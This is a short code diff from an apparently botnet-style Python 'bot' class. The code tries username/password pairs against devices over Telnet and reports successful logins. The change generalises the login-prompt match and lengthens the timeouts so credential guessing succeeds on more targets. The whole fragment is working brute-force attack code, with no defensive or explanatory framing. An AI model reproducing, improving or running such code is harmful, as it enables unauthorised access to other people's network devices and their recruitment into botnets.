@@ -145,11 +145,11 @@ class bot:
 				for username, password in auth_entries:
 					print(username+": "+password)
 					with Telnet(device['ip'], timeout=1) as tn:
-						tn.read_until(b"to17 login: ", timeout=0.1)
+						tn.read_until(b"login: ", timeout=0.5)
 						tn.write((username + '\n').encode('ascii'))
-						tn.read_until(b"Password: ", timeout=0.1)
+						tn.read_until(b"Password: ", timeout=0.5)
 						tn.write((password + '\n').encode('ascii'))
-						a = tn.read_until(b"\r\n", timeout=0.1)
+						a = tn.read_until(b"\r\n", timeout=0.5)
 						print(str(a))
 						if a == b"\r\n":
 							print('login worked!')
